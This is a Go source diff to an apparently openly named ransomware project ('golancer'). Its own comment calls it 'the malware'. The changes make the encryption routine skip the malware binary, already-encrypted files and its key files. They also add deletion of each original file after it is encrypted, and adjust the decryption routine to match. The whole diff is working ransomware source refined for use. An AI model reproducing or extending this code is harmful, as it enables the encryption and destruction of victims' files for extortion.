@@ -14,6 +14,7 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"path/filepath"
 	"strings"
 )
 
@@ -182,6 +183,23 @@ func DecryptAESKey(encryptedAESKey []byte, privateKey rsa.PrivateKey) []byte {
 }
 
 func EncryptFile(filename string, extension string, aeskey []byte) {
+
+	// Don't want to encrypt the malware itself ;) or any already encrypted files
+	switch {
+	case strings.HasSuffix(filename, filepath.Base(os.Args[0])):
+		return
+	case strings.HasSuffix(filename, extension):
+		return
+	case strings.HasSuffix(filename, "private.pem"):
+		return
+	case strings.HasSuffix(filename, "public.pem"):
+		return
+	case strings.HasSuffix(filename, "files.txt"):
+		return
+	case strings.HasSuffix(filename, "golancer.key"):
+		return
+	}
+
 	// Open target file
 	infile, err := os.Open(filename)
 	if err != nil {
@@ -231,13 +249,15 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 	}
 	// Append the initialization vector to end of file
 	outfile.Write(initvector)
+	os.Remove(filename)
 }
 
 func DecryptFile(filename string, extension string, aeskey []byte) {
 	// Open target file
-	infile, err := os.Open(filename)
+	infile, err := os.Open(filename + extension)
 	if err != nil {
-		log.Fatal(err)
+		log.Printf("File: %v, not found.", filename+extension)
+		return
 	}
 	// Close file once function has finished execution
 	defer infile.Close()
@@ -264,7 +284,7 @@ func DecryptFile(filename string, extension string, aeskey []byte) {
 		log.Fatal(err)
 	}
 	// Create file to write decrypted contents
-	outfile, err := os.OpenFile(strings.Trim(filename, extension), os.O_RDWR|os.O_CREATE, 0777)
+	outfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0777)
 	if err != nil {
 		log.Fatal(err)
 	}
